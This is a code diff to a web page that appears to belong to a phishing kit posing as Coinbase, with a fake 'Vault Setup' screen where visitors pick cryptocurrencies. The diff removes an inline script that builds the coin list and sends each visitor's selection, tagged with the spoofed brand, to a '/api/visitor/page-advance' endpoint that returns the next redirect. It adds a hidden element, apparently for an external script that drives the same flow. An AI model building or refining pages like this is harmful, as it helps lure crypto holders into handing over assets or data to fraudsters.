@@ -54,47 +54,18 @@
     <svg width="20" height="20" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C8.01 14 6 11.99 6 9.5S8.01 5 10.5 5 15 7.01 15 9.5 12.99 14 10.5 14z"/></svg>
     <input type="search" id="rv-search" placeholder="Search" autocomplete="off">
   </div>
+  <div
+    id="rv-market-host"
+    data-rv-coin-market="multi"
+    data-rv-market-list="rv-list"
+    data-rv-market-search="rv-search"
+    data-rv-market-continue="rv-continue"
+    hidden
+    aria-hidden="true"
+  ></div>
   <div class="rv-list" id="rv-list"></div>
   <button id="rv-continue" type="button" class="rv-btn" disabled>Continue</button>
   <div class="rv-support"><span>✉ Chat with support</span><span>⌃</span></div>
 </div>
-<script>
-(function(){
-  var ASSETS=[
-    {n:'Bitcoin',s:'BTC',p:'$84,291.00',c:'-1.12%',neg:true,img:'/_next/static/media/bitcoin.44da609b.png'},
-    {n:'Ethereum',s:'ETH',p:'$2,041.50',c:'-0.85%',neg:true,img:'/_next/static/media/ethereum.0a38a4d0.png'},
-    {n:'Tether',s:'USDT',p:'$1.00',c:'+0.01%',neg:false,img:'/_next/static/media/tether.84db185b.png'},
-    {n:'BNB',s:'BNB',p:'$612.40',c:'-0.42%',neg:true,img:'/_next/static/media/bnb.b1d88c4b.png'},
-    {n:'XRP',s:'XRP',p:'$2.18',c:'+1.24%',neg:false,img:'/_next/static/media/xrp.cebc03fb.png'},
-    {n:'Solana',s:'SOL',p:'$142.80',c:'-2.10%',neg:true,img:'/_next/static/media/solana.0c81d69c.png'}
-  ];
-  var selected=new Set(), listEl=document.getElementById('rv-list'), btn=document.getElementById('rv-continue'), q='';
-  function render(){
-    listEl.innerHTML='';
-    ASSETS.filter(function(a){ return !q || a.n.toLowerCase().indexOf(q)>=0 || a.s.toLowerCase().indexOf(q)>=0; })
-      .forEach(function(a,idx){
-        var row=document.createElement('div');
-        row.className='rv-row'+(selected.has(a.s)?' selected':'');
-        row.innerHTML='<span class="rv-rank">'+(idx+1)+'</span><img src="'+a.img+'" alt=""><div class="rv-row-info"><div class="rv-row-name">'+a.n+'</div><div class="rv-row-sym">'+a.s+'</div></div><div><div class="rv-row-price">'+a.p+'</div><div class="rv-row-chg '+(a.neg?'neg':'pos')+'">'+a.c+'</div></div><span class="rv-add">+</span>';
-        row.addEventListener('click',function(){
-          if(selected.has(a.s)) selected.delete(a.s); else selected.add(a.s);
-          var on=selected.size>0;
-          btn.disabled=!on;
-          btn.classList.toggle('enabled',on);
-          render();
-        });
-        listEl.appendChild(row);
-      });
-  }
-  document.getElementById('rv-search').addEventListener('input',function(e){ q=e.target.value.trim().toLowerCase(); render(); });
-  btn.addEventListener('click',function(){
-    if(btn.disabled) return;
-    btn.disabled=true;
-    fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Vault Setup',choice:Array.from(selected).join(', ')})})
-      .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;else btn.disabled=false;});
-  });
-  render();
-})();
-</script>
 </body>
 </html>
